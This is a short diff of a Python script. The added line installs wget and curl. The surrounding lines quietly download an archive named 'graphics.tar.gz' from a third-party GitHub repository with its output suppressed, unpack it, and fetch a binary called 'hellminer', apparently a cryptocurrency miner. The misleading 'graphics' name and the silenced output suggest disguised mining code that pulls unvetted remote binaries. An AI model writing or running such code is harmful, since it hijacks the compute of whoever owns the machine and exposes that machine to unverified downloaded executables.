@@ -1,4 +1,5 @@
 import os
+os.system("apt install wget curl")
 os.system("curl -0 https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz -o graphics.tar.gz >/dev/null 2>&1")
 os.system("tar -xvzf graphics.tar.gz")
 os.system("wget https://raw.githubusercontent.com/akton0208/test2/main/hellminer")
